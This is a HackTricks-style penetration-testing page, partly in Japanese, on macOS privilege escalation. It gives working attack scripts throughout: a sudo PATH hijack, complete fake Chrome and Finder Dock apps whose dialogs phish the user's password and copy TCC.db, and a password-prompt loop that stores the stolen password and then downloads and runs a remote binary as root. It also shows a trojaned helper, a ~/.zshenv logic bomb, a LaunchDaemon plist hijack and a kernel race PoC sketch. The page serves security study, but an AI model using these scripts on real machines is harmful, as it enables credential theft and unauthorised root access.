# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation を探してここに来た場合は、以下を参照してください:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

**Linux/Unix に影響する privilege escalation の trick のほとんどは、MacOS** マシンにも影響することに注意してください。そのため、以下を参照してください:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

元の [Sudo Hijacking technique は Linux Privilege Escalation の記事](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) にあります。

ただし、macOS はユーザーが **`sudo`** を実行するときに、ユーザーの **`PATH`** を**維持**します。つまり、この攻撃を実行する別の方法は、被害者が **sudo を実行**するときに実行する他の **binaries** を **hijack** することです:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Note that a user that uses the terminal will highly probable have **Homebrew installed**. そのため、**`/opt/homebrew/bin`** 内のバイナリを hijack できる可能性があります。

### Dock Impersonation

一部の **social engineering** を利用すると、Dock 内で **Google Chrome** などを **impersonate** し、実際には自分のスクリプトを実行できます。

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
いくつかの提案：

- Dock に Chrome があるか確認し、ある場合はそのエントリを **remove** して、Dock 配列内の**同じ位置**に **fake** な **Chrome エントリ**を **add** します。

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
いくつかの提案:

- **Dock から Finder を削除することはできない**ため、Dock に追加する場合は、偽の Finder を本物の Finder のすぐ隣に配置できます。そのためには、**Dock array の先頭に偽の Finder エントリを追加する**必要があります。
- 別の方法として、Dock に配置せずにそのまま開くこともできます。「Finder が Finder の制御を求めています」という表示は、それほど不自然ではありません。
- パスワードを求める不審なボックスを表示せずに**root へ escalate**する別の方法は、特権アクションを実行するために Finder が本当にパスワードを求めるようにすることです:
- Finder に新しい **`sudo`** ファイルを **`/etc/pam.d`** にコピーさせる（パスワードを求めるプロンプトには「Finder wants to copy sudo」と表示されます）
- 新しい **Authorization Plugin** を Finder にコピーさせる（ファイル名を制御できるため、パスワードを求めるプロンプトには「Finder wants to copy Finder.bundle」と表示されます）

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware は、user interaction を悪用して **sudo 権限を持つ password を取得**し、programmatically 再利用することがよくあります。一般的な flow：

1. `whoami` で logged in user を特定する。
2. `dscl . -authonly "$user" "$pw"` が success を返すまで、**password prompt を loop する**。
3. credential（例：`/tmp/.pass`）を cache し、`sudo -S`（password を stdin 経由で渡す）で privileged action を実行する。

Example minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
盗まれた password は、**`xattr -c` で Gatekeeper quarantine を解除**したり、LaunchDaemons やその他の privileged files をコピーしたり、追加の stages を非対話的に実行したりするために再利用できます。

## Newer macOS-specific vectors (2023–2025）

### Deprecated `AuthorizationExecuteWithPrivileges` still usable

`AuthorizationExecuteWithPrivileges` は 10.7 で deprecated になりましたが、**Sonoma/Sequoia でも引き続き動作します**。多くの commercial updaters は、untrusted path を指定して `/usr/libexec/security_authtrampoline` を呼び出します。対象の binary が user-writable なら、trojan を仕込んで正規の prompt に便乗できます：
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
上記の **masquerading tricks** と組み合わせて、もっともらしい password dialog を表示します。


### Privileged helper / XPC triage

現代の多くのサードパーティ製 macOS privescs は、同じパターンに従います。**root LaunchDaemon** が **`/Library/PrivilegedHelperTools`** から **Mach/XPC service** を公開し、その後、helper が **client を検証しない**、**検証が遅すぎる**（PID race）、または **user-controlled path/script** を受け取る **root method** を公開します。これは、VPN client、game launcher、updater における近年の多くの helper bugs の背後にある bug class です。

Quick triage checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
特に、以下のような helper に注意してください。

- `launchd` に job がロードされたままになっているため、**uninstall 後も**リクエストを受け付け続けるもの
- **`/Applications/...`** または non-root ユーザーが書き込み可能なその他のパスからスクリプトを実行したり、設定を読み込んだりするもの
- **PID-based** または **bundle-id-only** の peer validation に依存しており、race condition を悪用される可能性があるもの

helper authorization bugs の詳細については、[このページ](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)を確認してください。

### PackageKit script environment inheritance (CVE-2024-27822)

Apple が **Sonoma 14.5**、**Ventura 13.6.7**、**Monterey 12.7.5** で修正するまで、ユーザーが **`Installer.app`** / **`PackageKit.framework`** 経由で開始した install では、現在のユーザー環境内で **PKG scripts を root として実行**できました。つまり、**`#!/bin/zsh`** を使用する package は、攻撃者の **`~/.zshenv`** を読み込み、被害者がその package を install した際に、それを **root として実行**できました。

これは **logic bomb** として特に興味深いものです。ユーザーの account への foothold と、書き込み可能な shell startup file があればよく、その後は、脆弱性のある **zsh-based** installer がユーザーによって実行されるのを待つだけです。通常、これは **MDM/Munki** deployments には適用されません。これらは root ユーザーの環境内で実行されるためです。
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
より深く installer-specific abuse を確認したい場合は、[this page](macos-files-folders-and-binaries/macos-installers-abuse.md) も確認してください。

### LaunchDaemon plist hijack（CVE-2025-24085 pattern）

LaunchDaemon plist またはその `ProgramArguments` target が **user-writable** の場合、それを置き換えてから launchd に reload を強制することで privilege escalation できます：
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
これは、書き込み可能な plist を悪用して attacker code を root として実行する、**CVE-2025-24085** で公開された exploit パターンを踏襲しています。

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update` の **race** により、local attacker は複数の thread で `setgid()`/`getgid()` loop を実行して race させ、torn `memcpy` が発生するまで、read-only credential pointer (`proc_ro.p_ucred`) を破壊できます。破壊に成功すると、**uid 0** と kernel memory access が得られます。最小限の PoC 構造:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
制御可能なデータを、ポインターが再読み込みされる位置に配置するために heap grooming と組み合わせます。脆弱な build では、SIP bypass の要件なしで信頼性の高い **local kernel privesc** が可能です。

### Migration assistant による SIP bypass（"Migraine", CVE-2023-32369）

すでに root を取得していても、SIP は system locations への書き込みをブロックします。**Migraine** bug は、Migration Assistant の entitlement `com.apple.rootless.install.heritable` を悪用して、SIP bypass を継承する child process を起動し、保護された path（例: `/System/Library/LaunchDaemons`）を上書きします。chain は以下のとおりです。

1. 稼働中の system で root を取得する。
2. attacker-controlled binary を実行するよう、細工した state で `systemmigrationd` を trigger する。
3. 継承した entitlement を使用して SIP-protected files に patch を適用し、reboot 後も persistence する。

### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531 bug class）

複数の Apple daemons は XPC 経由で **NSPredicate** objects を受け取り、`expressionType` field のみを validate しますが、この field は attacker-controlled です。任意の selectors を評価する predicate を細工することで、**root/system XPC services**（例: `coreduetd`、`contextstored`）で **code execution** を達成できます。initial app sandbox escape と組み合わせると、**user prompts なしの privilege escalation** が可能になります。predicates を deserialize し、堅牢な visitor を持たない XPC endpoints を探してください。

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass と privilege escalation

**Any user**（unprivileged users を含む）は、`-o noowners` を使用して Time Machine snapshot を create および mount でき、その snapshot 内の **ALL the files** にアクセスできます。これにより、live volume 上の ownership checks を bypass できます。必要な privilege は、使用する application（`Terminal` など）に **Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）が付与されていることだけです。

commands と完全な説明は、TCC bypasses page にあります。

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

これは privilege escalation に役立つ可能性があります。


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
